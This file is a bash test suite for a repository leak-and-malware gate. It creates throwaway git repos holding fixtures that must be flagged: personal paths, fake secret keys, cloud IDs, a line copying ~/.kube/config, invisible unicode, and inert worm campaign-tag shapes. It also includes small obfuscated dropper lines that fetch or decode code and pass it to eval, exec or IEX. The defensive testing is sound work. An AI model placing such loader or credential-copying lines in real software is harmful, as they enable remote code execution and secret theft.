#!/usr/bin/env bash
# Fixture tests for check-oss-leaks.sh (private-context leak gate).
# All leak-shaped content is generated at runtime inside mktemp repos so this
# repository never carries a personal path, secret shape, or marker literal.
# Usage: bash scripts/test-oss-leaks.sh
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
GATE="$ROOT/scripts/check-oss-leaks.sh"
FAILURES=0

TMP="$(mktemp -d "${TMPDIR:-/tmp}/oss-leaks-test.XXXXXX")"
trap 'rm -rf "$TMP"' EXIT

# Isolate fixtures from the operator's git identity, hooks, and signing setup.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export ENGINEER_PRIVATE_MARKERS="$TMP/no-such-markers"

# Leak-shaped strings are assembled, never committed as literals.
HOMESEG="Users"
LEAK_PATH="/$HOMESEG/realoperator42/writing/corpus.txt"
NEUTRAL_PATH="/$HOMESEG/example/dev/notes.md"
SECRET_PREFIX="sk_"
SECRET_VALUE="${SECRET_PREFIX}live_abcdefghijklmnop"

new_repo() { # $1=dir
  git init -q "$1"
  git -C "$1" config user.email fixture@example.com
  git -C "$1" config user.name Fixture
  git -C "$1" config commit.gpgsign false
}

run_expect() { # label, dir, expected exit, [flags...]
  local label="$1" dir="$2" expect="$3"
  shift 3
  local out code=0
  set +e
  out=$(cd "$dir" && bash "$GATE" "$@" 2>&1)
  code=$?
  set -e
  if [[ "$code" -eq "$expect" ]]; then
    echo "  ✓ $label (exit $code)"
  else
    echo "  ✗ $label — expected exit $expect got $code"
    echo "$out" | tail -15
    FAILURES=$((FAILURES + 1))
  fi
  LAST_OUT="$out"
}

expect_in_output() { # label, needle
  if echo "$LAST_OUT" | grep -qF -- "$2"; then
    echo "  ✓ $1"
  else
    echo "  ✗ $1 — output lacks: $2"
    FAILURES=$((FAILURES + 1))
  fi
}

echo "engineer test-oss-leaks — runtime fixtures"
echo "---"

# 1) Personal home path in the tree fails with the PATH class; a neutral
#    placeholder home path stays clean.
R="$TMP/paths"; new_repo "$R"
printf 'corpus source: %s\n' "$LEAK_PATH" >"$R/setup.md"
printf 'fixture path: %s\n' "$NEUTRAL_PATH" >"$R/clean.md"
git -C "$R" add -A
run_expect "personal path fails --all" "$R" 1 --all
expect_in_output "PATH class labeled" "[PATH"
expect_in_output "generic layer runs without markers (warned once)" "marker layer: off"
rm "$R/setup.md"; git -C "$R" add -A
run_expect "neutral placeholder path is clean" "$R" 0 --all
expect_in_output "clean verdict" "CLEAN"

# 2) Marker layer: [names]/[business]/[paths] sections from a local file.
R="$TMP/markers"; new_repo "$R"
M="$TMP/markers.txt"
printf '# fixture markers\n[names]\nfixturecorp\n[business]\nacmedeal\n[paths]\n/data/fixturecorp\n[public]\nmarkers\n' >"$M"
printf 'shipped fixturecorp acmedeal notes from /data/fixturecorp/terms\n' >"$R/notes.md"
git -C "$R" add -A
run_expect "marker hits fail" "$R" 1 --all --markers "$M"
expect_in_output "MARKER class labeled" "[MARKER"
expect_in_output "business section attributed" "marker [business]"
ENGINEER_PRIVATE_MARKERS="$M" run_expect "env var marker file honored" "$R" 1 --all

# 3) Allow-pattern passthrough for public-identity exceptions.
R="$TMP/allow"; new_repo "$R"
printf 'maintainer contact: publicdev@gmail.com\n' >"$R/README.md"
git -C "$R" add -A
run_expect "unknown email fails" "$R" 1 --all
expect_in_output "PERSONAL class labeled" "[PERSONAL"
run_expect "allow pattern clears public identity" "$R" 0 --all --allow 'publicdev@gmail\.com'

# 4) Severity model: CRITICAL ignores --warn-only; MAJOR downgrades.
R="$TMP/severity"; new_repo "$R"
printf 'STRIPE_KEY="%s"\n' "$SECRET_VALUE" >"$R/config.txt"
git -C "$R" add -A
run_expect "secret fails --all" "$R" 1 --all
expect_in_output "SECRET class labeled" "[SECRET"
run_expect "secret still fails under --warn-only" "$R" 1 --all --warn-only
rm "$R/config.txt"
printf 'reach me at private.human@gmail.com\n' >"$R/notes.md"
git -C "$R" add -A
run_expect "major-only fails by default" "$R" 1 --all
run_expect "major-only passes under --warn-only" "$R" 0 --all --warn-only

# 5) Staged changeset is the default scope.
R="$TMP/staged"; new_repo "$R"
printf 'clean seed\n' >"$R/base.md"
git -C "$R" add -A && git -C "$R" commit -qm seed
printf 'draft with %s inside\n' "$LEAK_PATH" >"$R/draft.md"
run_expect "unstaged leak not scanned by default" "$R" 0
git -C "$R" add draft.md
run_expect "staged leak fails default scope" "$R" 1
expect_in_output "staged scope reported" "scope: staged"

# 6) --ref commit ranges.
git -C "$R" commit -qm leak
run_expect "--ref range catches committed leak" "$R" 1 --ref HEAD~1..HEAD
printf 'clean follow-up\n' >"$R/clean2.md"
git -C "$R" add clean2.md && git -C "$R" commit -qm clean
run_expect "--ref clean range passes" "$R" 0 --ref HEAD~1..HEAD

# 7) --public-only: unknown/private repos are skipped, [public]-listed scanned.
R="$TMP/visibility"; new_repo "$R"
printf 'note %s\n' "$LEAK_PATH" >"$R/leak.md"
git -C "$R" add -A
run_expect "--public-only skips unlisted repo" "$R" 0 --public-only --markers "$M"
expect_in_output "skip is explicit" "SKIP --public-only"
printf '[public]\nvisibility\n' >>"$M"
run_expect "--public-only scans listed repo" "$R" 1 --public-only --markers "$M"

# 8) Obfuscated code-execution droppers are CRITICAL and ignore --warn-only.
R="$TMP/dropper"; new_repo "$R"
{ printf 'const u = atob(process.env.AUTH_API_KEY);\n'
  printf 'module.exports = async () => { eval(await (await fetch(u)).text()); };\n'; } >"$R/build.config.js"
git -C "$R" add -A
run_expect "dropper shape fails" "$R" 1 --all
expect_in_output "DROPPER class labeled" "[DROPPER"
expect_in_output "same-file combination attributed" "exec sink (eval/new Function/vm/import/exec/IEX) + encoder/fetch"
run_expect "dropper still fails under --warn-only" "$R" 1 --all --warn-only
rm "$R/build.config.js"
printf 'export async function load(u) { return (await fetch(u)).json(); }\n' >"$R/loader.js"
git -C "$R" add -A
run_expect "fetch without eval stays clean" "$R" 0 --all

# 9) Base64 blobs under env-var keys in committed env files; .env.example exempt.
R="$TMP/envfile"; new_repo "$R"
printf 'AUTH_API_KEY=aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvcGF5bG9hZC5qcw==\n' >"$R/.env"
printf 'AUTH_API_KEY=your-key-here\n' >"$R/.env.example"
git -C "$R" add -A -f
run_expect "committed .env base64 blob fails" "$R" 1 --all
expect_in_output "env-file blob attributed" "base64 blob under an env-var key"
rm "$R/.env"; git -C "$R" add -A
run_expect ".env.example placeholder stays clean" "$R" 0 --all

# 10) Widened ENCODERS beyond base64 (hex/charCode/\x-run) still trip the same-file
#     rule when paired with an exec sink; lone encoder or lone sink stays clean.
R="$TMP/enc-hex"; new_repo "$R"
{ printf 'const p = String.fromCharCode(104,116,116,112);\n'
  printf 'eval(p);\n'; } >"$R/vite.config.js"
git -C "$R" add -A
run_expect "charCode encoder + eval trips DROPPER" "$R" 1 --all
expect_in_output "widened-encoder DROPPER labeled" "[DROPPER"
rm "$R/vite.config.js"
printf 'const p = String.fromCharCode(104,116,116,112);\nexport default p;\n' >"$R/clean.js"
git -C "$R" add -A
run_expect "encoder without a sink stays clean" "$R" 0 --all

# 11) Widened SINKS beyond eval (vm / dynamic import / Python exec / PowerShell IEX).
R="$TMP/sinks"; new_repo "$R"
printf 'const vm=require("vm");vm.runInContext(atob(x),ctx);\n' >"$R/vitest.setup.js"
git -C "$R" add -A
run_expect "vm.runInContext + atob trips DROPPER" "$R" 1 --all
rm "$R/vitest.setup.js"
printf 'import base64,os\nexec(base64.b64decode(os.environ["X"]))\n' >"$R/conftest.py"
git -C "$R" add -A
run_expect "python exec(b64decode(env)) trips DROPPER" "$R" 1 --all
expect_in_output "env-decode dataflow tell labeled" "decode of an env/argv value"
rm "$R/conftest.py"
printf 'IEX([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p)))\n' >"$R/hook.ps1"
git -C "$R" add -A
run_expect "PowerShell IEX + FromBase64String trips DROPPER" "$R" 1 --all

# 12) INVISIBLE_UNICODE (CRITICAL): hidden/bidi/variation-selector codepoints.
R="$TMP/invis"; new_repo "$R"
# U+200B zero-width space (e2 80 8b) spliced into a source token.
printf 'const loader = "payload\xe2\x80\x8bhidden";\n' >"$R/index.js"
git -C "$R" add -A
run_expect "zero-width codepoint fails" "$R" 1 --all
expect_in_output "INVISIBLE_UNICODE class labeled" "[INVISIBLE_UNICODE"
rm "$R/index.js"
# U+E0100 supplementary variation selector (GlassWorm class, f3 a0 84 80).
printf 'const x = 1;\xf3\xa0\x84\x80\n' >"$R/loader.ts"
git -C "$R" add -A
run_expect "supplementary variation selector fails" "$R" 1 --all
expect_in_output "still CRITICAL, no --warn-only downgrade" "no --warn-only downgrade"
rm "$R/loader.ts"
printf 'const emoji = "done ✅";\n' >"$R/ok.js"
git -C "$R" add -A
run_expect "ordinary emoji (U+FE0F excluded) stays clean" "$R" 0 --all

# 13) Negative controls: a lone dynamic import or lone eval never trips DROPPER.
R="$TMP/negctl"; new_repo "$R"
printf 'const mod = await import("./plugin.js");\nexport default mod;\n' >"$R/app.js"
git -C "$R" add -A
run_expect "lone dynamic import stays clean" "$R" 0 --all
printf 'export function run(code){ return eval(code); }\n' >"$R/repl.js"
git -C "$R" add -A
run_expect "lone eval without an encoder stays clean" "$R" 0 --all

# 14) Cloud identifiers (INFRA, MAJOR): AWS/GCP/Vercel/edge-PaaS ids and hosts map a
#     private topology; documented placeholders stay clean; provider tokens are SECRET.
#     Values are assembled at runtime so this file carries no id- or token-shaped literal.
R="$TMP/cloud"; new_repo "$R"
ACCT="2109$(printf '8765')4321"
printf 'role: arn:aws:iam::%s:role/deploy-prod\n' "$ACCT" >"$R/infra.yml"
git -C "$R" add -A
run_expect "AWS ARN with a real-looking account id fails" "$R" 1 --all
expect_in_output "INFRA class labeled" "[INFRA"
expect_in_output "AWS attributed" "AWS account/resource identifier"
run_expect "cloud ids downgrade under --warn-only" "$R" 0 --all --warn-only
printf 'role: arn:aws:iam::123456789012:role/example\n' >"$R/infra.yml"; git -C "$R" add -A
run_expect "AWS documented sample account stays clean" "$R" 0 --all
rm "$R/infra.yml"
printf 'sa: deployer@%s.iam.gserviceaccount.com\nurl: https://%s.run.app\n' "prod-ledger-4471" "ledger-api-q7x2ab" >"$R/gcp.yml"
git -C "$R" add -A
run_expect "GCP service account + run.app host fail" "$R" 1 --all
expect_in_output "GCP attributed" "GCP project/service-account identifier"
rm "$R/gcp.yml"
mkdir -p "$R/.vercel"
printf '{"projectId":"prj_%s","orgId":"team_%s"}\n' "Qm3xK9pLwZ2rT8vN5bH1cD" "Y7uJ4hG2sF6dA9kL3mP0qW" >"$R/.vercel/project.json"
git -C "$R" add -A -f
run_expect "Vercel project/team ids fail" "$R" 1 --all
expect_in_output "Vercel attributed" "Vercel project/team/deployment identifier"
rm -r "$R/.vercel"
printf 'deploy: https://my-app.vercel.app\nref: https://<project>.supabase.co\n' >"$R/docs.md"; git -C "$R" add -A
run_expect "placeholder deployment hosts stay clean" "$R" 0 --all
printf 'api: https://ledger-api-prod.fly.dev\n' >"$R/edge.yml"; git -C "$R" add -A
run_expect "edge/PaaS host fails" "$R" 1 --all
expect_in_output "edge attributed" "edge/PaaS deployment identifier"
rm "$R/edge.yml" "$R/docs.md"
FLYTOK="fo1_$(printf 'q%.0s' $(seq 1 28))"
printf 'FLY_API_TOKEN=%s\n' "$FLYTOK" >"$R/deploy.env.txt"; git -C "$R" add -A
run_expect "provider token is SECRET" "$R" 1 --all
expect_in_output "SECRET class labeled" "[SECRET"
run_expect "provider token still fails under --warn-only" "$R" 1 --all --warn-only
rm "$R/deploy.env.txt"
printf 'cp ~/.kube/config ./kubeconfig\n' >"$R/setup.sh"; git -C "$R" add -A
run_expect "credential dot-dir path fails (PATH)" "$R" 1 --all
expect_in_output "PATH class labeled" "[PATH"

# 15) WORM (CRITICAL): committed-config JS worm — campaign-tag assignment plus
#     whitespace-padded payload on the trailing line of a build config, the shape
#     a real 2026 incident used against postcss.config.mjs / tailwind.config.js.
#     Synthetic fixture — an inert marker string and dummy identifiers, never a
#     runnable obfuscator payload.
R="$TMP/worm"; new_repo "$R"
WORM_PAD="$(printf '%*s' 7000 '')"
printf 'export default config;%s%s\n' "$WORM_PAD" "global['!']='9-7678';var _0x1a2b3c=1;" >"$R/postcss.config.mjs"
git -C "$R" add -A
run_expect "worm campaign-tag + padding fails" "$R" 1 --all
expect_in_output "WORM class labeled" "[WORM"
expect_in_output "campaign-tag hit attributed" "campaign-tag assignment"
expect_in_output "padding hit attributed" "space/tab run before code"
run_expect "worm still fails under --warn-only" "$R" 1 --all --warn-only

# ...the earlier tag variant (global['_V']='A9-7678') plus a javascript-obfuscator
# dispatcher-function scaffold, in a tailwind config.
R="$TMP/wormtag"; new_repo "$R"
printf '};%s\n' "global['_V']='A9-7678';function _0x37df(){var _0x580eb4=[1,2,3,4,5];}" >"$R/tailwind.config.js"
git -C "$R" add -A
run_expect "earlier campaign tag + obfuscator scaffold fails" "$R" 1 --all
expect_in_output "obfuscator scaffold attributed" "javascript-obfuscator dispatcher function scaffold"

# ...negative: an ordinary config file stays clean.
R="$TMP/wormneg"; new_repo "$R"
printf 'module.exports = { plugins: { tailwindcss: {}, autoprefixer: {} } };\n' >"$R/postcss.config.js"
git -C "$R" add -A
run_expect "ordinary postcss config stays clean" "$R" 0 --all

# ...negative: a normal long minified line (no whitespace-padding run) stays clean.
R="$TMP/wormneg2"; new_repo "$R"
LONGLINE="var a=1;"
i=0
while [[ "$i" -lt 100 ]]; do LONGLINE+="b$i();"; i=$((i + 1)); done
printf '%s\n' "$LONGLINE" >"$R/bundle.min.js"
git -C "$R" add -A
run_expect "normal minified line without padding stays clean" "$R" 0 --all

# ...a second campaign-tag variant (global.i="A10-*32150") plus a distinct
# _0x-obfuscated identifier, whitespace-padded in a build config.
R="$TMP/wormv2"; new_repo "$R"
printf 'module.exports = {};%*s%s\n' 300 '' "global.i=\"A10-*32150\";const _0xabcd12=1;" >"$R/postcss.config.js"
git -C "$R" add -A
run_expect "second campaign-tag variant fails" "$R" 1 --all
expect_in_output "campaign-tag hit attributed" "campaign-tag assignment"

# ...the older long-form of that variant: global.i + require shim reassignment +
# a unicode-escaped module name inside require(...).
R="$TMP/wormv2old"; new_repo "$R"
python3 - "$R/vite.config.js" <<'PY'
import sys
path = sys.argv[1]
content = ('global.i="A10-*32150";global.r=require;'
           'typeof module==="object"&&(global.m=module);'
           'const http=require("\\u0068ttp");\n')
open(path, "w").write(content)
PY
git -C "$R" add -A
run_expect "older long-form variant + unicode-escaped require fails" "$R" 1 --all
expect_in_output "unicode-escaped require attributed" "unicode-escaped module name inside require()"

# ...negative: an ordinary require() call (no unicode escape) in a config file
# stays clean.
R="$TMP/wormreqneg"; new_repo "$R"
printf 'const http = require("http");\nmodule.exports = {};\n' >"$R/vite.config.js"
git -C "$R" add -A
run_expect "ordinary require() stays clean" "$R" 0 --all

echo "---"
if [[ "$FAILURES" -eq 0 ]]; then
  echo "OK — all leak-gate fixtures passed"
  exit 0
fi
echo "FAILED — $FAILURES fixture check(s)"
exit 1
